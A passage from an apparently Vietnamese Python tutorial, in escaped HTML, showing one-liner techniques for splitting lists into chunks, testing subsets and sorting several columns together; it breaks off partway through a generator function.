&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;[(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, None, None)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;zip_longest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;iter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fillvalue&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;[(0, 1, 2), (3, 4, 5), (6, 7, 8), (9, -1, -1)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lời giải số 1, 4 dùng cho các phiên bản Python từ 2.3 trở đi. Hai lời giải 2, 3 sau đòi hỏi phải có lệnh &lt;strong&gt;from itertools import *&lt;/strong&gt; và chỉ chạy từ Python 3.x trở đi. Chi tiết về các lời giải này các bạn có thể xem thêm: &lt;a class="reference external" href="http://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python"&gt;How do you split a list into evenly sized chunks in Python?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Vấn đề số 2 có thể có lời giải sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# SplitInto(list(range(10)), 3) với Python 3.x&lt;/span&gt;
&lt;span class="go"&gt;[[0, 3, 6, 9], [1, 4, 7], [2, 5, 8]]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lời giải trên là đơn giản đến mức... không cần tìm thêm các lời giải khác làm gì cho mệt. Tuy nhiên nó không chia theo đúng thứ tự.  Đây là cách khác phức tạp hơn nhưng giữ nguyên được thứ tự các phần tử:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt; \
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[[0, 1, 2], [3, 4, 5], [6, 7, 8, 9]]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[[0, 1, 2, 3, 4], [5, 6, 7, 8, 9]]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[[0, 1], [2, 3, 4], [5, 6], [7, 8, 9]]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cách viết này khá dài, nhưng giữ nguyên được thứ tự giữa các phần tử. Các dòng dài chính là đặc trưng của &lt;strong&gt;Python One-liner&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="kiem-tra-mot-list-la-tap-con-cua-list-khac"&gt;
&lt;h2&gt;5. Kiểm tra một list là tập con của list khác&lt;/h2&gt;
&lt;p&gt;Cho hai list a, b. kiểm tra xem a có chứa b hay không. Danh sách a chứa danh sách b nếu tất cả các phần tử của b đều có trong a. Cách giải sau đã có lần tôi trình bày, dùng thư viện &lt;strong&gt;operator&lt;/strong&gt; và hàm built-in &lt;strong&gt;reduce&lt;/strong&gt;, có thể dùng với mọi phiên bản Python 2.x:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;and_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__contains__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;and_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__contains__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Từ Python 2.4 bạn có thể sử dụng set:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;issubset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;issubset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Từ Python 2.5 bạn có thể viết:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Module &lt;strong&gt;operator&lt;/strong&gt; cung cấp cách dùng các toán tử như các hàm. Trong ví dụ 1 thực tế chúng ta dùng toán tử &lt;strong&gt;in&lt;/strong&gt; thông thường. Các toán tử dùng như các hàm cho phép kết hợp với các hàm built-in khác để viết các lệnh Python rất ngắn gọn và thuận tiện. Một ví dụ (được lấy trong tài liệu Python) tính tích vô hướng hai vector:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;sum(map(operator.mul, vector1, vector2))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thật khó để viết ngắn hơn và chạy nhanh hơn như vậy. Các ví dụ trên càng nói rõ hơn điều tôi đã nhấn mạnh ở mục 3: các phiên bản Python càng về sau càng hỗ trợ tốt hơn việc viết các mã ngắn gọn và hiệu quả. Tuy vậy bạn phải cân nhắc &lt;em&gt;lựa chọn giải pháp đúng&lt;/em&gt; cho phiên bản Python mà nó sẽ chạy.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="sap-xep-nhieu-column"&gt;
&lt;h2&gt;6. Sắp xếp nhiều column&lt;/h2&gt;
&lt;p&gt;Cho các column a, b, c... có cùng kích thước. Hãy sắp xếp chúng theo thứ tự a, b, c.... Nội dung các dòng không thay đổi. Dưới đây là một ví dụ triển khai với 2 cột a, b:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;
&lt;span class="go"&gt;(1, 1, 2, 2, 3, 3)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;
&lt;span class="go"&gt;(&amp;#39;a&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thật tuyệt!!!. Chúng đơn giản đến mức khó có thể ngắn gọn hơn nữa. Công thức trên trọn vẹn trên một dòng có ít hơn 80 ký tự. Tất cả chỉ có 4 lệnh. Ít nhất nó cũng gây cho tôi nhiều sự phấn khích và ngạc nhiên. Và các bạn sẽ thấy trên nhiều forum Python, việc tìm kiếm các &amp;quot;One-Liner&amp;quot; thực sự là thú vị và là trò chơi hấp dẫn của các Python guru.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="tong-ket"&gt;
&lt;h2&gt;7. Tổng kết&lt;/h2&gt;
&lt;p&gt;Khi kích thước dữ liệu đầu vào lớn một số trong các hàm trả về list trên đây cần được thay thế bằng các hàm trạng thái. Chẳng hạn việc chia một list thành nhiều list bằng nhau nên viết thành hàm trạng thái, sẽ dùng ít bộ nhớ và nhanh hơn:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;SplitInto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
